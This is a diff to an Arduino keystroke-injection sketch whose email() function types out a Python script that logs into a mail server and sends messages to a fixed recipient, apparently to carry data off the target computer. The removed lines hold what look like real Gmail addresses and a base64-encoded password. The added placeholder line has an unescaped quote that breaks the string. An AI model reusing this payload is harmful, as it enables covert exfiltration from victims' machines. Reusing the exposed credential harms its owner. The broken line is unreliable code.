@@ -25,11 +25,11 @@ void email(){
   delay(10);
   Keyboard.write(0xB0);
   delay(10);
-  Keyboard.print("fromaddr = \"doorlog1@gmail.com\"");
+  Keyboard.print("fromaddr = \"SEND_ADDR\"");
   delay(10);
   Keyboard.write(0xB0);
   delay(10);
-  Keyboard.print("toaddr = \"satrajit2013@gmail.com\"");
+  Keyboard.print("toaddr = \"RECV_ADDR\"");
   delay(10);
   Keyboard.write(0xB0);
   delay(10);
@@ -129,7 +129,7 @@ void email(){
   delay(10);
   Keyboard.write(0xB0);
   delay(10);
-  Keyboard.print("  server.login(fromaddr, \"cDQ1NXcwcmQxNXRoMTU=\".decode('base64'))");
+  Keyboard.print("  server.login(fromaddr, \"PASSWORD IN BASE64".decode('base64'))");
   delay(10);
   Keyboard.write(0xB0);
   delay(10);
